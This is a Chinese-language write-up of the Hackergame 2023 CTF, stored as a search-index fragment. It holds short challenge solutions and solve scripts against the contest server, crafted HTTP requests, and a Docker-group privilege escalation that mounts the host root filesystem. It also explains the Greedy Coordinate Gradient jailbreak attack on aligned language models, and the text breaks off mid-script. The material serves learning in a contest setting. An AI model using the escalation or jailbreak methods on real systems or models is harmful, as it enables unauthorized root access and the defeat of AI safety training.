\u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3","title":"Hackergame 2023"},{"location":"writeups/hackergame2023/#hackergame","text":"\u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity","title":"Hackergame \u542f\u52a8"},{"location":"writeups/hackergame2023/#_1","text":"\u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053","title":"\u732b\u54aa\u5c0f\u6d4b"},{"location":"writeups/hackergame2023/#_2","text":"\u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14","title":"\u66f4\u6df1\u66f4\u6697"},{"location":"writeups/hackergame2023/#30","text":"\u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002","title":"\u65c5\u884c\u7167\u7247 3.0"},{"location":"writeups/hackergame2023/#_3","text":"\u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002","title":"\u8d5b\u535a\u4e95\u5b57\u68cb"},{"location":"writeups/hackergame2023/#flag","text":"\u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002","title":"\u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b"},{"location":"writeups/hackergame2023/#_4","text":"\u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag )","title":"\u7ec4\u59d4\u4f1a\u6a21\u62df\u5668"},{"location":"writeups/hackergame2023/#_5","text":"\u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG","title":"\u866b"},{"location":"writeups/hackergame2023/#json-yaml","text":"\u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002","title":"JSON \u2282 YAML?"},{"location":"writeups/hackergame2023/#git-git","text":"\u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002","title":"Git? Git!"},{"location":"writeups/hackergame2023/#http","text":"\u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web \u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002","title":"HTTP \u96c6\u90ae\u518c"},{"location":"writeups/hackergame2023/#docker-for-everyone","text":"\u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine","title":"Docker for Everyone"},{"location":"writeups/hackergame2023/#20","text":"\u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags ))","title":"\u60dc\u5b57\u5982\u91d1 2.0"},{"location":"writeups/hackergame2023/#_6","text":"\u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002","title":"\ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403"},{"location":"writeups/hackergame2023/#_7","text":"\u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3","title":"\ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403"},{"location":"writeups/hackergame2023/#llm-attacks","text":"\u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models","title":"LLM Attacks"},{"location":"writeups/hackergame2023/#background","text":"\u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\]","title":"Background"},{"location":"writeups/hackergame2023/#method","text":"\u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] \u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980","title":"Method"},{"location":"writeups/hackergame2023/#_8","text":"\u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 Done import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 